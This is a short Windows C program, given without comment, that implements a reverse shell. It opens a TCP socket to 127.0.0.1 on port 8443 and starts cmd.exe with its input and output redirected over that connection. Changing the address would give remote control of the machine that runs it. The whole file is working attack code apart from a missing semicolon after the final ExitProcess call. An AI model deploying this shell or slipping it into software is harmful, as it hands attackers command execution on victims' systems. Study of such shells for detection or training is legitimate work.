#include <winsock2.h>
#include <stdio.h>
#pragma comment(lib,"ws2_32")

void main(int argc, char *argv[])
{
    WSADATA wsaData;
    SOCKET hSocket;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    struct sockaddr_in adik_sin;
        
    memset(&adik_sin, 0, sizeof(adik_sin));
    memset(&si, 0, sizeof(si));
    WSAStartup(MAKEWORD(2,0), &wsaData);
    hSocket = WSASocket(AF_INET, SOCK_STREAM, NULL, NULL, NULL, NULL);
    adik_sin.sin_family = AF_INET;
    adik_sin.sin_port = htons(8443);
    adik_sin.sin_addr.s_addr = inet_addr("127.0.0.1");
    connect(hSocket, (struct sockaddr*)&adik_sin, sizeof(adik_sin));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = si.hStdOutput = si.hStdError = (void *)hSocket;
    CreateProcess(NULL, "cmd", NULL, NULL, TRUE, NULL, NULL, NULL, &si, &pi);
    ExitProcess(0)
}